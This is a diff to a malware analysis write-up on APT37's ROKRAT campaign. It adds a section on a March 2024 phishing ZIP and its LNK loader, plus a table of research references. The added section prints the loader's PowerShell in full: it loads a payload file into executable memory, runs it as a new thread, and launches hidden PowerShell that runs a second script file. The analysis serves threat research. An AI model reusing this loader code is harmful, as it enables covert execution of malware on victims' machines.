@@ -8,7 +8,7 @@ In order to deploy the backdoor onto the victim machine, APT37 utilizes spear-ph
 
 (Phishing email example)
 
-The following samples analyzed are some of the files distributed in the campaigns from February to March 2024. ([link](https://www.virustotal.com/graph/gd37ef280e73c42a9bc47faf14dfa977ad28044dcb83b48de80d07722f8a34bb5) to the virus total graph)
+The following samples analyzed are some of the files distributed in the campaigns from February to March 2024.
 
 ## 북한지 기고문 (1).zip
 
@@ -176,4 +176,50 @@ $bastString | Out-File -FilePath $executePath -Encoding ascii;& $executePath;
 $lnkFile.Close();
 remove-item -path $lnkPath -force;
 ```
+## 동북공정(미국의회조사국(CRS Report).zip
+
+Nothing has changed in the infection chain of this last campaign analyzed in March:  phishing email -> 동북공정(미국의회조사국(CRS Report).zip file -> 동북공정(미국의회조사국(CRS Report).pdf.lnk loader -> **ROKRAT**
+
+([link](https://bazaar.abuse.ch/sample/b1025baa59609708315326fe4279d8113f7af3f292470ef42c33fccbb8aa3e56/) to the 동북공정(미국의회조사국(CRS Report).pdf.lnk sample on Malware Bazaar)
+
+```ps1
+$exePath=$env:public+'\'+'panic.dat';
+$exeFile = Get-Content -path $exePath -encoding byte;
+[Net.ServicePointManager]::SecurityProtocol = [Enum]::ToObject([Net.SecurityProtocolType], 3072);
+$k1123 = [System.Text.Encoding]::UTF8.GetString(34) + 'kernel32.dll' + [System.Text.Encoding]::UTF8.GetString(34);
+$a90234s = '[DllImport(' + $k1123 + ')]public static extern IntPtr GlobalAlloc(uint b,uint c);';
+$b = Add-Type -MemberDefinition $a90234s  -Name 'AAA' -PassThru;
+$d3s9sdf = '[DllImport(' + $k1123 + ')]public static extern bool VirtualProtect(IntPtr a,uint b,uint c,out IntPtr d);';
+$a90234sb = Add-Type -MemberDefinition $d3s9sdf -Name 'AAB' -PassThru;
+$b3s9s03sfse = '[DllImport(' + $k1123 + ')]public static extern IntPtr CreateThread(IntPtr a,uint b,IntPtr c,IntPtr d,uint e,IntPtr f);';
+$cake3sd23 = Add-Type -MemberDefinition $b3s9s03sfse  -Name 'BBB' -PassThru;
+$dtts9s03sd23 = '[DllImport(' + $k1123 + ')]public static extern IntPtr WaitForSingleObject(IntPtr a,uint b);';
+$fried3sd23 = Add-Type -MemberDefinition $dtts9s03sd23 -Name 'DDD' -PassThru;
+$byteCount = $exeFile.Length;
+$buffer = $b::GlobalAlloc(0x0040, $byteCount + 0x100);
+$old = 0;
+$a90234sb::VirtualProtect($buffer, $byteCount + 0x100, 0x40, [ref]$old);
+
+for($i = 0; $i -lt $byteCount; $i++) {
+    [System.Runtime.InteropServices.Marshal]::WriteByte($buffer, $i, $exeFile[$i]);
+ };
+$handle = $cake3sd23::CreateThread(0, 0, $buffer, 0, 0, 0);
+$fried3sd23::WaitForSingleObject($handle, 500 * 1000);
+
+start /min C:\Windows\SysWow64\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden "$stringPath=$env:temp+'\'+'para.dat';
+$stringByte = Get-Content -path $stringPath -encoding byte;
+$string = [System.Text.Encoding]::UTF8.GetString($stringByte);
+$scriptBlock = [scriptblock]::Create($string);
+&$scriptBlock;"
+```
+
+## Resources
+
+|Resources|
+|---------|
+|[RokRAT 악성코드를 유포하는 LNK 파일 (수료증 위장)](https://asec.ahnlab.com/ko/64423/)|
+|[Genians' report (2024-03-27)](https://www.genians.co.kr/blog/threat_intelligence/webinar-apt)|
+|[SentinelLabs's report (January 2024)](https://www.sentinelone.com/labs/a-glimpse-into-future-scarcruft-campaigns-attackers-gather-strategic-intelligence-and-target-cybersecurity-professionals/)|
+|[Plainbit's report about (안보칼럼) 반국가세력에 안보기관이 무기력해서는 안된다.zip](https://blog.plainbit.co.kr/lnk_rokrat/)|
+|[Virus Total graph](https://www.virustotal.com/graph/gd37ef280e73c42a9bc47faf14dfa977ad28044dcb83b48de80d07722f8a34bb5)|
 
